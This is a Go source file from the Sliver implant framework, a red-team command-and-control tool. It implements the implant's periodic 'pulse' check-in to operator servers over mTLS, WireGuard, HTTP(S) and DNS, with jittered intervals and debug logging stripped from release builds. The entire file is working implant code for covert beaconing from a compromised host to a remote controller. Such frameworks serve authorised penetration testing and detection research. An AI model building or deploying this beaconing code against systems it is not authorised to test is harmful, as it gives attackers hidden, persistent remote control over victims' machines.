package transports

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if .Config.IsPulse}}

import (
	"io"

	// {{if .Config.Debug}}
	"log"

	// {{end}}

	"net/url"
	"time"

	// {{if .Config.IncludeMTLS}}
	"crypto/tls"

	"github.com/bishopfox/sliver/implant/sliver/transports/mtls"

	// {{end}}

	// {{if or .Config.IncludeMTLS .Config.IncludeWG}}
	"errors"

	"github.com/hashicorp/yamux"

	// {{end}}

	// {{if .Config.IncludeHTTP}}
	"github.com/bishopfox/sliver/implant/sliver/transports/httpclient"
	// {{end}}

	// {{if .Config.IncludeWG}}
	"net"

	"github.com/bishopfox/sliver/implant/sliver/transports/wireguard"
	"golang.zx2c4.com/wireguard/device"

	// {{end}}

	// {{if or .Config.IncludeMTLS .Config.IncludeWG}}
	"strconv"
	// {{end}}

	// {{if .Config.IncludeDNS}}

	"github.com/bishopfox/sliver/implant/sliver/transports/dnsclient"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/util"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
)

var (
	_ url.URL
	_ io.Writer
)

type PulseInit func() error
type PulseStart func() error
type PulseRecv func() (*pb.Envelope, error)
type PulseSend func(*pb.Envelope) error
type PulseClose func() error
type PulseCleanup func() error

// Pulse - Abstract connection to the server
type Pulse struct {
	Init    PulseInit
	Start   PulseStart
	Send    PulseSend
	Recv    PulseRecv
	Close   PulseClose
	Cleanup PulseCleanup

	ActiveC2 string
	ProxyURL string
}

// Interval - Interval between pulses
func (b *Pulse) Interval() int64 {
	return GetInterval()
}

// Jitter - Jitter between pulses
func (b *Pulse) Jitter() int64 {
	return GetJitter()
}

// Duration - Interval + random value <= Jitter
func (b *Pulse) Duration() time.Duration {
	// {{if .Config.Debug}}
	log.Printf("Interval: %v Jitter: %v", b.Interval(), b.Jitter())
	// {{end}}
	jitterDuration := time.Duration(0)
	if 0 < b.Jitter() {
		jitterDuration = time.Duration(util.Int63n(b.Jitter()))
	}
	duration := time.Duration(b.Interval()) + jitterDuration
	// {{if .Config.Debug}}
	log.Printf("Duration: %v", duration)
	// {{end}}
	return duration
}

// StartPulseLoop - Starts the pulse loop generator
func StartPulseLoop(abort <-chan struct{}) <-chan *Pulse {
	// {{if .Config.Debug}}
	log.Printf("Starting pulse loop ...")
	// {{end}}

	var pulse *Pulse
	nextPulse := make(chan *Pulse)

	innerAbort := make(chan struct{})
	c2Generator := C2Generator(innerAbort)

	go func() {
		defer close(nextPulse)
		defer func() {
			innerAbort <- struct{}{}
		}()

		// {{if .Config.Debug}}
		log.Printf("Recv from c2 generator ...")
		// {{end}}
		for uri := range c2Generator {
			// {{if .Config.Debug}}
			log.Printf("Next CC = %s", uri.String())
			// {{end}}

			switch uri.Scheme {

			// *** MTLS ***
			// {{if .Config.IncludeMTLS}}
			case "mtls":
				pulse = mtlsPulse(uri)
				// {{end}}  - IncludeMTLS
			case "wg":
				// *** WG ***
				// {{if .Config.IncludeWG}}
				pulse = wgPulse(uri)
				// {{end}}  - IncludeWG
			case "https":
				fallthrough
			case "http":
				// *** HTTP ***
				// {{if .Config.IncludeHTTP}}
				pulse = httpPulse(uri)
				// {{end}} - IncludeHTTP

			case "dns":
				// *** DNS ***
				// {{if .Config.IncludeDNS}}
				pulse = dnsPulse(uri)
				// {{end}} - IncludeDNS

			default:
				// {{if .Config.Debug}}
				log.Printf("Unknown c2 protocol %s", uri.Scheme)
				// {{end}}
			}
			select {
			case nextPulse <- pulse:
			case <-abort:
				return
			}
		}
	}()

	return nextPulse
}

// {{if .Config.IncludeMTLS}}
func mtlsPulse(uri *url.URL) *Pulse {
	// {{if .Config.Debug}}
	log.Printf("Pulse -> %s", uri.String())
	// {{end}}
	var err error
	lport, err := strconv.Atoi(uri.Port())
	if err != nil {
		lport = 8888
	}

	var conn *tls.Conn
	var muxSession *yamux.Session
	pulse := &Pulse{
		ActiveC2: uri.String(),
		Init: func() error {
			return nil
		},
		Start: func() error {
			conn, err = mtls.MtlsConnect(uri.Hostname(), uint16(lport))
			if err != nil {
				return err
			}
			if conn == nil {
				return errors.New("[mtls] connect returned nil conn")
			}
			if _, err := conn.Write([]byte(mtls.YamuxPreface)); err != nil {
				_ = conn.Close()
				return err
			}
			cfg := yamux.DefaultConfig()
			// {{if .Config.Debug}}
			cfg.Logger = log.Default()
			cfg.LogOutput = nil
			// {{else}}
			cfg.Logger = nil
			cfg.LogOutput = io.Discard
			// {{end}}
			muxSession, err = yamux.Client(conn, cfg)
			if err != nil {
				_ = conn.Close()
				return err
			}
			if muxSession == nil {
				_ = conn.Close()
				return errors.New("[mtls] failed to create yamux session (nil)")
			}
			return nil
		},
		Recv: func() (*pb.Envelope, error) {
			if muxSession == nil {
				return nil, errors.New("[mtls] recv called with nil yamux session")
			}
			stream, err := muxSession.Accept()
			if err != nil {
				return nil, err
			}
			if isNilInterface(stream) {
				return nil, errors.New("[mtls] accept returned nil stream")
			}
			defer stream.Close()
			return mtls.ReadEnvelope(stream)
		},
		Send: func(envelope *pb.Envelope) error {
			if envelope == nil {
				return errors.New("[mtls] nil envelope")
			}
			if muxSession == nil {
				return errors.New("[mtls] send called with nil yamux session")
			}
			stream, err := muxSession.Open()
			if err != nil {
				return err
			}
			if isNilInterface(stream) {
				return errors.New("[mtls] open returned nil stream")
			}
			defer stream.Close()
			return mtls.WriteEnvelope(stream, envelope)
		},
		Close: func() error {
			if muxSession != nil {
				_ = muxSession.Close()
				muxSession = nil
			}
			if conn != nil {
				err = conn.Close()
				if err != nil {
					return err
				}
				conn = nil
			}
			return nil
		},
		Cleanup: func() error {
			return nil
		},
	}

	return pulse
}

// {{end}}

// {{if .Config.IncludeWG}}
func wgPulse(uri *url.URL) *Pulse {
	// {{if .Config.Debug}}
	log.Printf("Establishing Pulse -> %s", uri.String())
	// {{end}}
	lport, err := strconv.Atoi(uri.Port())
	if err != nil {
		lport = 53
	}

	var conn net.Conn
	var dev *device.Device
	var muxSession *yamux.Session
	pulse := &Pulse{
		ActiveC2: uri.String(),
		Init: func() error {
			return nil
		},
		Start: func() error {
			addrs, err := net.LookupHost(uri.Hostname())
			if err != nil {
				return err
			}
			if len(addrs) == 0 {
				return errors.New("{{if .Config.Debug}}Invalid address{{end}}")
			}
			hostname := addrs[0]
			conn, dev, err = wireguard.WGConnect(hostname, uint16(lport))
			if err != nil {
				return err
			}
			if _, err := conn.Write([]byte(wireguard.YamuxPreface)); err != nil {
				closeWGPulseResources(nil, conn, dev)
				conn = nil
				dev = nil
				return err
			}
			cfg := yamux.DefaultConfig()
			// {{if .Config.Debug}}
			cfg.Logger = log.Default()
			cfg.LogOutput = nil
			// {{else}}
			cfg.Logger = nil
			cfg.LogOutput = io.Discard
			// {{end}}
			muxSession, err = yamux.Client(conn, cfg)
			if err != nil {
				closeWGPulseResources(nil, conn, dev)
				conn = nil
				dev = nil
				return err
			}
			return nil
		},
		Recv: func() (*pb.Envelope, error) {
			stream, err := muxSession.Accept()
			if err != nil {
				return nil, err
			}
			defer stream.Close()
			return wireguard.ReadEnvelope(stream)
		},
		Send: func(envelope *pb.Envelope) error {
			return sendWGPulseEnvelope(muxSession, envelope)
		},
		Close: func() error {
			closeWGPulseResources(muxSession, conn, dev)
			muxSession = nil
			conn = nil
			dev = nil
			return nil
		},
		Cleanup: func() error {
			return nil
		},
	}
	return pulse
}

// closeWGPulseResources permanently closes each per-check-in resource. A
// device.Down only stops the bind and peers; it leaves the netstack TUN and
// WireGuard worker goroutines alive, so pulse reconnects must use Close.
func closeWGPulseResources(muxSession *yamux.Session, conn net.Conn, dev *device.Device) {
	if muxSession != nil {
		_ = muxSession.Close()
	}
	if conn != nil {
		_ = conn.Close()
	}
	if dev != nil {
		closeWGPulseDevice(dev.Close)
	}
}

func closeWGPulseDevice(closeDevice func()) {
	if closeDevice != nil {
		closeDevice()
	}
}

const wgPulseStreamReceiptTimeout = 5 * time.Second

func sendWGPulseEnvelope(muxSession *yamux.Session, envelope *pb.Envelope) error {
	if envelope == nil {
		return errors.New("[wg] nil pulse envelope")
	}
	return sendWGPulseStream(muxSession, wgPulseStreamReceiptTimeout, func(stream net.Conn) error {
		return wireguard.WriteEnvelope(stream, envelope)
	})
}

// sendWGPulseStream waits for the peer's FIN after writing the request. A
// successful yamux write only means the frame reached the local transport; the
// remote FIN proves the server read the complete request before the pulse
// tears down the WireGuard session.
func sendWGPulseStream(muxSession *yamux.Session, receiptTimeout time.Duration, write func(net.Conn) error) error {
	if muxSession == nil {
		return errors.New("[wg] send called with nil yamux session")
	}
	if receiptTimeout <= 0 {
		return errors.New("[wg] invalid pulse stream receipt timeout")
	}
	stream, err := muxSession.Open()
	if err != nil {
		return err
	}
	if isNilInterface(stream) {
		return errors.New("[wg] open returned nil stream")
	}
	defer func() { _ = stream.Close() }()

	if err := write(stream); err != nil {
		return err
	}
	if err := stream.SetReadDeadline(time.Now().Add(receiptTimeout)); err != nil {
		return err
	}
	if err := stream.Close(); err != nil {
		return err
	}
	_, err = io.Copy(io.Discard, stream)
	return err
}

// {{end}}

// {{if .Config.IncludeHTTP}}
func httpPulse(uri *url.URL) *Pulse {

	// {{if .Config.Debug}}
	log.Printf("Pulseing -> %s", uri)
	// {{end}}

	var client *httpclient.SliverHTTPClient
	var err error
	opts := httpclient.ParseHTTPOptions(uri)
	pulse := &Pulse{
		ActiveC2: uri.String(),
		ProxyURL: opts.ProxyConfig,
		Init: func() error {
			client, err = httpclient.HTTPStartSession(uri.Host, uri.Path, opts)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[pulse] http(s) connection error %s", err)
				// {{end}}
				return err
			}
			return nil
		},
		Start: func() error {
			return nil
		},
		Recv: func() (*pb.Envelope, error) {
			return client.ReadEnvelope()
		},
		Send: func(envelope *pb.Envelope) error {
			return client.WriteEnvelope(envelope)
		},
		Close: func() error {
			return nil
		},
		Cleanup: func() error {
			return client.CloseSession()
		},
	}

	return pulse
}

// {{end}}

// {{if .Config.IncludeDNS}}
func dnsPulse(uri *url.URL) *Pulse {
	var client *dnsclient.SliverDNSClient
	var err error
	pulse := &Pulse{
		ActiveC2: uri.String(),
		Init: func() error {
			opts := dnsclient.ParseDNSOptions(uri)
			client, err = dnsclient.DNSStartSession(uri.Hostname(), opts)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[pulse] dns connection error %s", err)
				// {{end}}
				return err
			}
			return nil
		},
		Start: func() error {
			return nil
		},
		Recv: func() (*pb.Envelope, error) {
			return client.ReadEnvelope()
		},
		Send: func(envelope *pb.Envelope) error {
			return client.WriteEnvelope(envelope)
		},
		Close: func() error {
			return nil
		},
		Cleanup: func() error {
			return client.CloseSession()
		},
	}
	return pulse
}

// {{end}} - IncludeDNS

// {{end}} - IsPulse
